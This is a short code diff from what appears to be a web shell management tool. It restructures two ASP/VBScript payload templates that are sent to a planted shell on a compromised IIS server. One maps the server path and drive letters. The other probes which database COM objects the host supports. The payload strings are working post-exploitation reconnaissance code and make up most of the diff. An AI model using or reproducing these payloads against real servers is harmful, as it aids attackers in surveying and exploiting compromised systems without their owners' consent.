@@ -4,10 +4,12 @@
  */
 
 module.exports = () => ({
-  info:
-    `Dim S:SET C=CreateObject("Scripting.FileSystemObject"):If Err Then:S="ERROR:// "&Err.Description:Err.Clear:Else:S=Server.Mappath(".")&chr(9):For Each D in C.Drives:S=S&D.DriveLetter&chr(58):Next:End If:Response.Write(S)`,
+  info: {
+    _: `Dim S:SET C=CreateObject("Scripting.FileSystemObject"):If Err Then:S="ERROR:// "&Err.Description:Err.Clear:Else:S=Server.Mappath(".")&chr(9):For Each D in C.Drives:S=S&D.DriveLetter&chr(58):Next:End If:Response.Write(S)`
+  },
   probedb: // 检测数据库函数支持
-    `Function fe(strobj):
+  {
+    _: `Function fe(strobj):
     on error resume next:
     fe=0:
     server.CreateObject(strobj):
@@ -17,5 +19,6 @@ module.exports = () => ({
     m=split(m,"|"):
     for i=0 to ubound(m):
     Response.Write(m(i)&chr(9)&fe(m(i))&chr(10)):
-    next:`.replace(/\n\s+/g, ''),
+    next:`.replace(/\n\s+/g, '')
+  },
 })
